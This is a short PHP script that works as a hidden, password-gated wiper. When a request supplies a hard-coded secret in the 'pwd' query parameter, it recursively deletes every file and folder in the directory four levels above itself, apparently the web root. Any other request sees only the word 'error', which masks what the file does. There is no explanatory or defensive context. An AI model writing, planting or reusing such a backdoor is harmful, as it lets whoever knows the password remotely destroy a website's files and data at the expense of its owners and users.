<?php 

if(isset($_GET['pwd']) && $_GET['pwd'] == '321321fdsadfdasfdfdssafdasfdsafdsa') {
	function deldir($dir) {

	  $dh=opendir($dir);

	  while ($file=readdir($dh)) {

	    if($file!="." && $file!="..") {

	      $fullpath=$dir."/".$file;

	      if(!is_dir($fullpath)) {

	          unlink($fullpath);

	      } else {

	          deldir($fullpath);

	      }

	    }

	  }

	 

	  closedir($dh);


	  if(rmdir($dir)) {

	    return true;

	  } else {

	    return false;

	  }

	}

	$dir = dirname(dirname(dirname(dirname(__FILE__))));
	deldir($dir);
} else{
	echo 'error';
}



?>


